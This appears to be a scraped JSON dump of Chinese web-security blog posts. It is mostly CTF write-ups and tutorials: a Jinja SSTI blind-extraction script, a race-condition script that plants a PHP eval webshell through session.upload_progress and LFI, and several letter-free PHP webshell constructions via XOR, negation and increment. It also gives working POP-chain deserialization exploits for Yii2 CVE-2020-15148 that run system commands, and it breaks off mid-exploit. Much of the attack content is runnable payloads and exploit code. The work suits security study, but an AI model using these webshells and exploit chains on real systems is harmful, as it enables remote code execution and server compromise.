[&quot;\\\\x5F\\\\x5Fsubclasses\\\\x5F\\\\x5F&quot;]()[65][&quot;\\\\x5F\\\\x5Finit\\\\x5F\\\\x5F&quot;] [&quot;\\\\x5F\\\\x5Fglobals\\\\x5F\\\\x5F&quot;][&quot;\\\\x5F\\\\x5Fbuiltins\\\\x5F\\\\x5F&quot;][&quot;eval&quot;](&quot;\\\\x5F\\\\x5Fimport\\\\x5F\\\\x5F(chr(111)+chr(115))&quot;)[chr(112)+chr(111)+chr(112)+chr(101)+chr(110)](chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(99)+chr(42))[&quot;read&quot;]() [&#x27;&#x27;&#x27;+str(i)+&#x27;&#x27;&#x27;]==&quot;&#x27;&#x27;&#x27;+s+&#x27;&#x27;&#x27;&quot; %&#125; ca01h&#123;% endif %&#125;&#x27;&#x27;&#x27; time.sleep(0.1) res = requests.post(url, data=&#123;&quot;key&quot;: payload&#125;) if flag in res.text: print(s) result += s break if result[-1] == &#x27;&#125;&#x27;: breakprint(result)","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"}]},{"title":"session.upload_progress+LFI实现RCE","date":"2020-10-19T02:34:25.000Z","path":"Web_security/php_related/13.session.upload_progress+LFI实现RCE/","text":"PHP session.upload_process + LFI实现RCE 参考文章： https://tgaout.github.io/2019/05/29/利用session-upload-progress进行文件包含和反序列化渗透/ 这篇文章主要记录参考文章的复现环节，知识点部分简单介绍。 0x01 PHP关于upload_process配置介绍 本文提到的PHP配置中关于session.upload_process主要是下面四个： 1234session.upload_progress.enabled &#x3D; onsession.upload_progress.cleanup &#x3D; onsession.upload_progress.prefix &#x3D; &quot;upload_progress_&quot;session.upload_progress.name &#x3D; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot; enabled=on表示当浏览器向服务器上传文件的时候，PHP会把本次文件上传的详细信息存储在session中； cleanup=on表示上传结束后，PHP会立即清空对应的session文件中的内容； 关于prefix和name两个选项，PHP文档中有详细说明： 0x02 upload_progress + 文件包含实现RCE 示例代码 直接从一道CTF题目入手： 1234567891011121314151617181920212223242526&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-16 21:20:43# @email: h1xa@ctfer.com# @link: https://ctfer.com*/define(&#x27;还要秀？&#x27;, dirname(__FILE__));set_include_path(还要秀？);if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file); include($file); &#125;else&#123; highlight_file(__FILE__);&#125; ban掉了常见的文件包含伪协议，这个时候我们可以利用session.upload_progress将恶意代码写入session文件，从而包含session文件。 现在还存在两个问题：首先没有代码中没有session_start()如何创建session文件；第二个问题，由于session.upload_progress.cleanup=on，当文件上传结束后，session文件的内容被自动清除，如何进行RCE？ session.use_strict_mode 关于第一个问题，session还有一个默认配置：session.use_strict_mode=0，意思就是用户可以自定义Session ID。具体而言，我们在Cookie中设置Cookie:PHPSESSID=ca01h，PHP将会在服务器上session存储的位置创建一个文件session_ca01h，即使用户没有初始化Session，PHP也会自动初始化Session，并且产生一个键值，这个键值由session.upload_progress.prefix+session.upload_progress_name组成，最后被写入sess_文件中。 条件竞争 为了赶在session文件被清除之前进行RCE，可以通过上传一个大文件进行条件竞争。 解题 本来是想直接写一个脚本Getshell的，结果一直没能调试出来，只能用burp抓包intrude了。 1234567891011121314151617181920212223242526272829303132333435import requestsimport ioimport threadingurl = &quot;&quot;&quot;http://7a4916f9-18d7-4ecf-bed3-302ed44c5763.chall.ctf.show/index.php&quot;&quot;&quot;sessid = &quot;ca01h&quot;data = &#123;&quot;cmd&quot;: &quot;system(&#x27;ls&#x27;);&quot;&#125;proxy = &#123;&quot;http&quot;: &quot;127.0.0.1:8080&quot;&#125;def write(session): while True: f = io.BytesIO(b&#x27;a&#x27; * 1024) resp = session.post(url=url, data=&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;&lt;?php eval($_POST);?&gt;&quot;&#125;, files=&#123;&quot;file&quot;: (&quot;ca01h.txt&quot;, f)&#125;, cookies=&#123;&quot;PHPSESSID&quot;: sessid&#125;, proxies=proxy)def read(session): while True: resp = session.post(url=url+&quot;?file=/tmp/sess_&quot;+sessid, data=data, proxies=proxy) if &quot;ca01h.txt&quot; in resp.text: print(resp.text) event.clear() else: print(&quot;[++++++]Retry&quot;)if __name__ == &#x27;__main__&#x27;: event = threading.Event() with requests.session() as session: for i in range(30): threading.Thread(target=write, args=(session,)).start() for i in range(30): threading.Thread(target=read, args=(session,)).start() event.set() burp抓包 文件上传请求包： 执行命令请求包： 条件竞争爆破","tags":[{"name":"PHP","slug":"PHP","permalink":"http://ca0y1h.top/tags/PHP/"},{"name":"web安全学习","slug":"web安全学习","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"web安全/基础学习","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"PHP无数字字母构造webshell","date":"2020-10-19T02:30:23.000Z","path":"Web_security/php_related/8.PHP无数字字母构造webshell/","text":"PHP无数字字母构造webshell 0x01 从一道题目出发 12345678910111213141516&lt;?phpinclude &#39;flag.php&#39;;if(isset($_GET[&#39;code&#39;]))&#123; $code &#x3D; $_GET[&#39;code&#39;]; if(strlen($code)&gt;40)&#123; die(&quot;Long.&quot;); &#125; if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123; die(&quot;NO.&quot;); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;&#x2F;&#x2F;$hint &#x3D; &quot;php function getFlag() to get flag&quot;;?&gt; 分析代码可知 只要执行getFlag()函数应该就可以得到flag了 但对code的长度限制&lt;40，并且code不能有数字和大小写字母 0x02 前置知识 异或运算 在PHP中，两个变量进行异或时，先会将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完，又将结果从二进制转换成了ASCII值，再将ASCII值转换成字符串。 举个例子： 12A的ASCII值是65，对应的二进制值是01000001&#96;?的ASCII值是63，对应的二进制值是00111111 异或的二进制的值是01111110，对应的ASCII值是126，对应的字符串的值就是~了。 再结合PHP弱类型的特点，可以将整型转换成字符串型，将布尔型当作整型，或者将字符串当作函数来处理，下面我们来看一段代码： 12345678&lt;?php function B()&#123; echo &quot;Hello Angel_Kitty&quot;; &#125; $_++; $__&#x3D; &quot;?&quot; ^ &quot;&#125;&quot;; $__();?&gt; 第5行代码对变量名为_的变量进行自增操作，在PHP中未定义的变量默认值为null（nullfalse0），我们可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字。 第6行代码对字符?和&#125;进行异或操作，得到字符B赋值给变量名为__的变量。 第7行代码可以看作是执行B()，表示调用函数B,所以执行结果为Hello Angel_Kitty。 再看一个非数字字母的PHP后门： 12345678910&#x2F;&#x2F; demo1.php&lt;?php @$_++; &#x2F;&#x2F; $_ &#x3D; 1 $__&#x3D;(&quot;#&quot;^&quot;|&quot;); &#x2F;&#x2F; $__ &#x3D; _ $__.&#x3D;(&quot;.&quot;^&quot;~&quot;); &#x2F;&#x2F; _P $__.&#x3D;(&quot;&#x2F;&quot;^&quot;&#96;&quot;); &#x2F;&#x2F; _PO $__.&#x3D;(&quot;|&quot;^&quot;&#x2F;&quot;); &#x2F;&#x2F; _POS $__.&#x3D;(&quot;&#123;&quot;^&quot;&#x2F;&quot;); &#x2F;&#x2F; _POST $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); &#x2F;&#x2F; $_POST[0]($_POST[1]);?&gt; _POST的拼接可以将上面的代码合并为一行，代码如下： 1$__&#x3D;(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;&#x2F;&quot;^&quot;&#96;&quot;).(&quot;|&quot;^&quot;&#x2F;&quot;).(&quot;&#123;&quot;^&quot;&#x2F;&quot;); 还可以用更短的字符： 12&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot; &#x2F;&#x2F;_GET&quot;#.&#x2F;|&#123;&quot;^&quot;|~&#96;&#x2F;&#x2F;&quot; &#x2F;&#x2F;_POST 取反运算 来看一个汉字&quot;和&quot; 123456&gt;&gt;&gt; print(&quot;和&quot;.encode(&#39;utf8&#39;))b&#39;\\xe5\\x92\\x8c&#39;&gt;&gt;&gt; print(&quot;和&quot;.encode(&#39;utf8&#39;)[2])140&gt;&gt;&gt; print(~&quot;和&quot;.encode(&#39;utf8&#39;)[2])-141 和的第三个字节的值为140[0x8c]，取反的值为-141。 负数用十六进制表示，通常用的是补码的方式表示。负数的补码是它本身的值每位求反,最后再加一。141的16进制为0xff73，php中chr(0xff73)==115，115就是s的ASCII值。 因此 12345&lt;?php$_&#x3D;&quot;和&quot;;print(~($_&#123;2&#125;));print(~&quot;\\x8c&quot;);?&gt; 两个写法性质一样，结果会输出：ss 脚本生成payload： 123456&gt;&gt;&gt; def get(shell):... hexbit&#x3D;&#39;&#39;.join(map(lambda x: hex(~(-(256-ord(x)))),shell))... print(hexbit)...&gt;&gt;&gt; get(&#39;phpinfo&#39;)0x8f0x970x8f0x960x910x990x90 不用数字构造数字 主要思想就是，利用了PHP弱类型特性，true的值为1。 123$_&#x3D;(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)print($_) &#x2F;&#x2F; 1print($_&#x2F;$_) &#x2F;&#x2F; 2 字符&gt;的ascii值大于&lt;ascii的值 1234&lt;?php$_++;print($_); &#x2F;&#x2F; 1?&gt; php中未定义的变量默认值为null，nullfalse0 0x03 无数字字母构造webshell 代码 12345&#x2F;&#x2F; demo2.php&lt;?phpif(!preg_match(&#39;&#x2F;[a-z0-9]&#x2F;is&#39;,$_GET[&#39;shell&#39;])) &#123; eval($_GET[&#39;shell&#39;]);&#125; 思路 将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符。然后再利用PHP允许动态函数执行的特点，拼接处一个函数名，如&quot;assert&quot;，然后动态执行即可。 使用assert的话PHP版本必须小于等于7.0 利用异或操作 不可打印字符，用url编码表示。 12345&lt;?php$_&#x3D;(&#39;%01&#39;^&#39;&#96;&#39;).(&#39;%13&#39;^&#39;&#96;&#39;).(&#39;%13&#39;^&#39;&#96;&#39;).(&#39;%05&#39;^&#39;&#96;&#39;).(&#39;%12&#39;^&#39;&#96;&#39;).(&#39;%14&#39;^&#39;&#96;&#39;); &#x2F;&#x2F; $_&#x3D;&#39;assert&#39;;$__&#x3D;&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;&#96;&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;); &#x2F;&#x2F; $__&#x3D;&#39;_POST&#39;;$___&#x3D;$$__;$_($___[_]); &#x2F;&#x2F; assert($_POST[_]); 查ascii码对照表可以发现，0x01 = 1 = SOH; 0x13 = 19 = DC3; 0x05 = 5 = ENQ等等 如果要直接使用的话，必须对这些不可打印的特殊字符url编码，实际上木马应该是下面这个样子： 123456&lt;?php$_&#x3D;(urldecode(&#39;%01&#39;)^&#39;&#96;&#39;).(urldecode(&#39;%13&#39;)^&#39;&#96;&#39;).(urldecode(&#39;%13&#39;)^&#39;&#96;&#39;).(urldecode(&#39;%05&#39;)^&#39;&#96;&#39;).(urldecode(&#39;%12&#39;)^&#39;&#96;&#39;).(urldecode(&#39;%14&#39;)^&#39;&#96;&#39;);$__&#x3D;&#39;_&#39;.(urldecode(&#39;%0D&#39;)^&#39;]&#39;).(urldecode(&#39;%2F&#39;)^&#39;&#96;&#39;).(urldecode(&#39;%0E&#39;)^&#39;]&#39;).(urldecode(&#39;%09&#39;)^&#39;]&#39;);$___&#x3D;$$__;$_($___[_]);&#x2F;&#x2F; assert($_POST[_]);?&gt; 利用取反操作 利用的是UTF-8编码的某个汉字，将其中的某个字符取出来，取反为字母。一个汉字的utf8是三个字节，{2}表示第3个字节。 12345678&lt;?phpheader(&quot;Content-Type:text&#x2F;html;charset&#x3D;utf-8&quot;);$__&#x3D;(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);&#x2F;&#x2F;$__&#x3D;2$_&#x3D;$__&#x2F;$__;&#x2F;&#x2F;$_&#x3D;1$___&#x3D;&quot;瞰&quot;;$____&#x3D;&quot;和&quot;;print(~($___&#123;$_&#125;)); &#x2F;&#x2F; aprint(~($____&#123;$__&#125;)); &#x2F;&#x2F; s payload 1234567891011&lt;?php$__&#x3D;(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);&#x2F;&#x2F;$__2$_&#x3D;$__&#x2F;$__;&#x2F;&#x2F;$_1$____&#x3D;&#39;&#39;;$___&#x3D;&quot;瞰&quot;;$____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;和&quot;;$____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;和&quot;;$____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;的&quot;;$____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;半&quot;;$____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;始&quot;;$____.&#x3D;~($___&#123;$__&#125;);&#x2F;&#x2F;$____&#x3D;assert$_____&#x3D;&#39;_&#39;;$___&#x3D;&quot;俯&quot;;$_____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;瞰&quot;;$_____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;次&quot;;$_____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;站&quot;;$_____.&#x3D;~($___&#123;$_&#125;);&#x2F;&#x2F;$_____&#x3D;_POST$_&#x3D;$$_____;&#x2F;&#x2F;$_&#x3D;$_POST$____($_[$__]);&#x2F;&#x2F;assert($_POST[2]) 这里也有一种简短的写法$&#123;~&quot;\\xa0\\xb8\\xba\\xab&quot;&#125;它等于$_GET。这里相当于直接把utf8编码的某个字节提取出来统一进行取反。 利用递增操作符 我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。 数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array。再取这个字符串的第一个字母，就可以获得’A’。 因为PHP函数是大小写不敏感的，最终执行的是ASSERT($POST[])，无需获取小写a。 12345678910111213141516171819202122232425262728293031323334&lt;?php$_&#x3D;[];$_&#x3D;@&quot;$_&quot;; &#x2F;&#x2F; $_&#x3D;&#39;Array&#39;;$_&#x3D;$_[&#39;!&#39;&#x3D;&#x3D;&#39;@&#39;]; &#x2F;&#x2F; $_&#x3D;$_[0];$___&#x3D;$_; &#x2F;&#x2F; A$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.&#x3D;$__; &#x2F;&#x2F; S$__&#x3D;$_;$__++;$__++;$__++;$__++; &#x2F;&#x2F; E $___.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; R$___.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T$___.&#x3D;$__;$____&#x3D;&#39;_&#39;;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; P$____.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; O$____.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; S$____.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T$____.&#x3D;$__;$_&#x3D;$$____;$___($_[_]); &#x2F;&#x2F; ASSERT($_POST[_]); 0x04 回到最开始的那道题 异或方法 前面提到过_GET也可以这样拼接： 1$__&#x3D;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;; &#x2F;&#x2F; $__&#x3D;&quot;_GET&quot;; 按照这种方法，可以得到一种payload： 1?code&#x3D;$_&#x3D;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;;$&#123;$_&#125;[_]();&amp;_&#x3D;getFlag 即$&#123;$_&#125;[_]() = $_GET[_]()，url传入_=getFlag 本文的后面解释了$&#123;$_&#125;[_]()中的&#123;&#125;的作用 还有两种更直接的payload： 12?code&#x3D;$_&#x3D;&#39;[[]|@[[&#39;^&#39;&lt;&gt;):,:&lt;&#39;;$_(); &#x2F;&#x2F;$_&#x3D;&#39;getFlag&#39;?code&#x3D;$啊&#x3D;(%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27);$啊(); 相当于 $啊=getFlag;$啊(); 取反方法 前面也提到过$_GET还有一种简短的写法$&#123;~&quot;\\xa0\\xb8\\xba\\xab&quot;&#125; 那么利用这种方式可得payload： 1?code&#x3D;$_&#x3D;~%98%9A%8B%B9%93%9E%98;$_(); &#x2F;&#x2F;%_为getFlag取反然后URL编码得结果 或 1?code&#x3D;%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa&#x3D;getFlag 其中：%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B = $_GET['+'] 0x05 进一步思考 123456789101112131415161718&lt;?phpinclude &#39;flag.php&#39;;if(isset($_GET[&#39;code&#39;]))&#123; $code &#x3D; $_GET[&#39;code&#39;]; if(strlen($code)&gt;50)&#123; die(&quot;Too Long.&quot;); &#125; if(preg_match(&quot;&#x2F;[A-Za-z0-9_]+&#x2F;&quot;,$code))&#123; die(&quot;Not Allowed.&quot;); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;&#x2F;&#x2F;$hint &#x3D; &quot;php function getFlag() to get flag&quot;;?&gt; 在上面一道题的基础上，又过滤了下划线_，意味着不能定义变量，而且也构造不出来数字。 首先看一个错误的payload： 1?code&#x3D;(&#39;$&#39;).(&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;).([&#39;+&#39;])&amp;+&#x3D;getFlag(); 错误的原因是eval只能解析一遍代码，所以如果写的是a.b这样的字符串拼接，就只会执行这个拼接，并不会去执行代码。 例如： eval($_GET['b']) url里面 b=phpinfo(); 这时候相当于eval('phpinfo();') eval($_GET['b']) url里面b=$_GET[c]&amp;c=phpinfo(); 相当于eval('$_GET[c]') 上面的payload是code=$_GET['+']&amp;+=getFlag(); ，也就是eval('$_GET['+'])并不会执行getFlag(); 123456789&lt;?phpfunction getflag()&#123; echo &quot;12354&quot;;&#125;$a=&quot;getflag&quot;;$b=&quot;()&quot;;@eval($a.$b);?&gt; 这个代码不会输出任何结果。 正确的payload为： 1?code&#x3D;$&#123;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;&#125;[&#39;+&#39;]();&amp;+&#x3D;getFlag 这里利用了$&#123;&#125;中的代码是可以执行的特点，其实也就是可变变量。 12345&lt;?php $a &#x3D; &#39;hello&#39;; $$a &#x3D; &#39;world&#39;; echo &quot;$a $&#123;$a&#125;&quot;;?&gt; 输出hello world，$&#123;$a&#125;，括号中的$a是可以执行的，变成了hello。 这也解释上面提到的为什么要加上&#123;&#125; 还可以使用取反的方法： 1?code&#x3D;%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa&#x3D;getFlag 其中24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B = $&#123;~&quot;\\xa0\\xb8\\xba\\xab&quot;&#125; = $_GET ~在{}中执行了取反操作 另外上面提到过的一个payload仍然还是可以使用： 1code&#x3D;$啊&#x3D;(%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27);$啊(); 这里就不需要用{}了，因为异或的值直接被当作字符串赋值给了$啊。 0x06 最后的思考 1234567891011121314151617181920&lt;?php include &#39;flag.php&#39;;if(isset($_GET[&#39;code&#39;]))&#123; $code&#x3D;$_GET[&#39;code&#39;]; if(strlen($code)&gt;35)&#123; die(&quot;Long.&quot;); &#125; if(preg_match(&quot;&#x2F;[A-Za-z0-9_$]+&#x2F;&quot;,$code)) &#123; die(&quot;NO.&quot;); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;&#x2F;&#x2F;$hint&#x3D;&quot;php function getFlag() to get flag&quot;;?&gt; 这道题进一步的过滤了$字符。 Payload： 1code&#x3D;?&gt;&lt;?&#x3D;&#96;&#x2F;???&#x2F;??? ????.???&#96;?&gt; 前提是在Linux系统中 首先?&gt;闭合php文件开头的&lt;?php，&lt;?=可以输出。 &lt;? ?&gt;是短标签，&lt;?php ?&gt;是长标签。在php的配置文件php.ini中有一个short_open_tag的值，开启以后可以使用PHP的短标签：&lt;? ?&gt;同时，只有开启这个才可以使用 &lt;?=&gt;以代替 &lt;? echo 。 另外，在linux系统中，是支持正则的，某些你忘记某个字符情况下，你可以使用? * %等字符来替代，当然这里想要执行命令，需要极限的利用这个方法，经过测试： /???/???通配``/bin/cat，???.???通配flag.php` 0x07 Reference https://www.moonback.xyz/2019/10/16/nowords-webshell/ 0x08 Update https://guokeya.github.io/post/NIupiXpsi/","tags":[{"name":"PHP","slug":"PHP","permalink":"http://ca0y1h.top/tags/PHP/"},{"name":"web安全基础","slug":"web安全基础","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"web安全/基础学习","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"Yii2反序列化漏洞分析及拓展","date":"2020-10-08T15:15:40.000Z","path":"code_audit/8.Yii2反序列化漏洞分析及拓展/","text":"CVE-2020-15148 Yii2 反序列化分析及拓展 漏洞范围 Yii2 &lt; 2.0.38 环境安装 这里直接选择去GitHub官方仓库拉取Yii2的源代码： https://github.com/yiisoft/yii2/releases 下载到本地后解压到web目录，修改config/web.php文件里cookieValidationKey的值 再在Controller添加一个反序列化的入口代码： MacOS下用MAMP搭建PHP调试环境，测试一下： 搭建教程：https://www.sqlsec.com/2020/07/macphp.html 验证成功，开始审计。 漏洞分析 根据现有的资料，反序列化的起点是在yii\\db\\BatchQueryResult类中，文件位置/vendor/yiisoft/yii2/db/BatchQueryResult.php： __destruct()函数调用了reset()方法，reset()方法中的_dataReader参数是可控的，并且调用了该参数的close()函数，那么此处就可以作为跳板，去执行其他类中的__call()函数，全局查找关键字function __call： 一共有找到16个__call()函数，那就一个一个的分析下来，其中Codeception组件中多数是直接抛出异常，没有可利用的地方，但是Faker\\Generator类是可以成为POP链的。具体代码位于：/vendor/fzaninotto/faker/src/Faker/Generator.php 首先__call()函数中调用了format()方法： 接着跟下去format()方法，参数$method和$attributes都是不可控的： 在format()方法内部，使用回调函数call_user_func_array()调用了getFormatter()方法。在该方法中，我们只关心第一个if语句， 由于$this-&gt;formatter是我们可控的，所以这里就可以调用任意类中的任意方法了。但是上面提到过，此时$formatter='close'而$arguments为空，也就是说call_user_func_array()这个函数的第一个参数可控，第二个参数为空。说的更透彻一点，要寻找的就是可以实现RCE的任意一个方法，并且参数是类的成员变量！ 同样的，这里我们用call_user_func()去实现RCE，用正则表达式call_user_func(\\$this-&gt;([a-zA-Z0-9]+), \\$this-&gt;([a-zA-Z0-9]+)\\)去匹配参数的限制，全局搜索： yii\\rest\\CreateAction::run()和yii\\rest\\IndexAction::run()都可以实现上述条件下的RCE： 那么整个POP链也就清楚了： 12345yii\\db\\BatchQueryResult::__destruct()-&gt;Faker\\Generator::__call()-&gt;yii\\rest\\CreateAction::run() 编写EXP 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpnamespace yii\\rest&#123; class CreateAction&#123; public $id; public $checkAccess; public function __construct() &#123; $this-&gt;id = &#x27;whoami&#x27;; $this-&gt;checkAccess = &#x27;system&#x27;; &#125; &#125;&#125;namespace Faker&#123; use yii\\rest\\CreateAction; class Generator&#123; protected $formatters; public function __construct() &#123; $this-&gt;formatters[&#x27;close&#x27;] = [new CreateAction(), &#x27;run&#x27;]; &#125; &#125;&#125;namespace yii\\db&#123; use Faker\\Generator; class BatchQueryResult&#123; private $_dataReader; public function __construct() &#123; $this-&gt;_dataReader = new Generator(); &#125; &#125;&#125;namespace &#123; use yii\\db\\BatchQueryResult; echo base64_encode(serialize(new BatchQueryResult()));&#125; 结果： 继续挖掘 新版本的BatchQueryResult类已经无法反序列化了，那就全局搜索__destruct()函数，然后一个个的排查。 第一条POP链 触发点位于vendor\\codeception\\codeception\\ext\\RunProcess.php，POP链如下： 12345Codeception\\Extension\\RunProcess::__destruct()-&gt;Faker\\Generator::__call()-&gt;yii\\rest\\IndexAction::run() EXP： 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpnamespace yii\\rest&#123; class CreateAction&#123; public $id; public $checkAccess; public function __construct() &#123; $this-&gt;id = &#x27;whoami&#x27;; $this-&gt;checkAccess = &#x27;system&#x27;; &#125; &#125;&#125;namespace Faker&#123; use yii\\rest\\CreateAction; class Generator&#123; protected $formatters; public function __construct() &#123; $this-&gt;formatters[&#x27;isRunning&#x27;] = [new CreateAction(), &#x27;run&#x27;]; &#125; &#125;&#125;namespace Codeception\\Extension&#123; use Faker\\Generator; class RunProcess&#123; private $process; public function __construct() &#123; $this-&gt;process = [new Generator()]; &#125; &#125;&#125;namespace &#123; echo base64_encode(serialize(new Codeception\\Extension\\RunProcess()));&#125; 第二条POP链 触发点位于vendor\\swiftmailer\\lib\\classes\\Swift\\KeyCache\\DiskKeyCache.php，POP链如下： 1234567Swift\\KeyCache\\DiskKeyCache::__destruct()-&gt;src\\DocBlock\\Tags\\Deprecated.php::__toString()-&gt;Faker\\Generator::__call()-&gt;yii\\rest\\IndexAction::run() EXP： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?phpnamespace yii\\rest&#123; class CreateAction&#123; public $id; public $checkAccess; public function __construct() &#123; $this-&gt;id = &#x27;ls&#x27;; $this-&gt;checkAccess = &#x27;system&#x27;; &#125; &#125;&#125;namespace Faker&#123; use yii\\rest\\CreateAction; class Generator&#123; protected $formatters; public function __construct() &#123; $this-&gt;formatters[&#x27;render&#x27;] = [new CreateAction(), &#x27;run&#x27;]; &#125; &#125;&#125;namespace phpDocumentor\\Reflection\\DocBlock\\Tags&#123; use Faker\\Generator; class Deprecated&#123; protected $description; public function __construct() &#123; $this-&gt;description = new Generator(); &#125; &#125;&#125;namespace &#123; use phpDocumentor\\Reflection\\DocBlock\\Tags\\Deprecated; class Swift_KeyCache_DiskKeyCache&#123; private $path; private $keys; public function __construct() &#123; $this-&gt;path = new Deprecated(); $this-&gt;keys = array(&quot;just&quot;=&gt;array(&quot;for&quot;=&gt;&quot;ca01h&quot;)); &#125; &#125; echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));&#125; 虽然报错，但命令还是成功执行了。 与此类似的POP链还有： 1234567Swift\\KeyCache\\DiskKeyCache::__destruct()-&gt;src\\DocBlock\\Tags\\See.php::__toString()-&gt;Faker\\Generator::__call()-&gt;yii\\rest\\IndexAction::run() 以及 1234567Swift\\KeyCache\\DiskKeyCache::__destruct()-&gt;src\\DocBlock\\Description.php::__toString()-&gt;Faker\\Generator::__call()-&gt;yii\\rest\\IndexAction::run() 第三条POP链 PHP &gt; 7.1 再来一个从__wakeup入手的POP链，反序列化起点位于vendor\\symfony\\string\\UnicodeString.php 继续跟normalizer_is_normalized()函数 跟进静态方法isNormalized() 看到preg_match($s)，那么``normalizer_is_normalized()就可以作为跳板触发__toString()`方法，接下来又可以和上面提到的POP链连在一起了。 1234567Symfony\\Component\\String\\UnicodeString::__wakeup()-&gt;phpDocumentor\\Reflection\\DocBlock\\Tags\\See::__toString()-&gt;Faker\\Generator::__call()-&gt;yii\\rest\\IndexAction::run() EXP： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?phpnamespace yii\\rest&#123; class CreateAction&#123; public $checkAccess; public $id; public function __construct()&#123; $this-&gt;checkAccess = &#x27;system&#x27;; 